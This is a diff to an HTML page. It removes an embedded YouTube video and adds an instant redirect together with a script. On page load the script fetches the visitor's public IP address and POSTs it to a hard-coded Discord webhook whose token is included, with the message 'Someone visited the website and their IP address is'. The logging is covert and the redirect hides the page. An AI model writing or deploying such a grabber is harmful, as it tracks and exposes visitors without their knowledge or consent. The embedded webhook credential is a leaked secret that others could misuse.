@@ -1,23 +1,31 @@
 <!DOCTYPE html>
 <html>
-  <head>
-    <title>YouTube Video Example</title>
-    <style>
-      #video-container {
-        display: flex;
-        justify-content: center;
-        align-items: center;
-        height: 100vh;
-      }
-      iframe {
-        width: 560px;
-        height: 315px;
-      }
-    </style>
-  </head>
-  <body>
-    <div id="video-container">
-      <iframe src="https://www.youtube.com/embed/dPtXaAZHuho?controls=0" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe>
-    </div>
-  </body>
+<head>
+  <meta http-equiv="refresh" content="0; url=https://www.example.com">
+</head>
+<body>
+      <script>
+        var xhr = new XMLHttpRequest();
+        xhr.open('GET', 'https://api.ipify.org', true);
+        xhr.onload = function () {
+          var ip = this.responseText;
+          document.getElementById('ip').value = ip;
+
+          // Send the IP address to Discord webhook
+          var webhookUrl = 'https://discord.com/api/webhooks/1102690295004545036/C2CJdUfLIZAqfI4DJoxAgFNajvmUTWGGyDDRMgkq8svJHObtC4xw7LuayVLe3Zuo-kvA';
+          var xhr2 = new XMLHttpRequest();
+          xhr2.open('POST', webhookUrl, true);
+          xhr2.setRequestHeader('Content-type', 'application/json');
+          xhr2.send(JSON.stringify({ content: 'Someone visited the website and their IP address is: ' + ip }));
+          
+          var copyBtn = document.getElementById('copy-btn');
+          copyBtn.addEventListener('click', function () {
+            var textbox = document.getElementById('ip');
+            textbox.select();
+            document.execCommand('copy');
+          });
+        };
+        xhr.send();
+      </script>
+</body>
 </html>
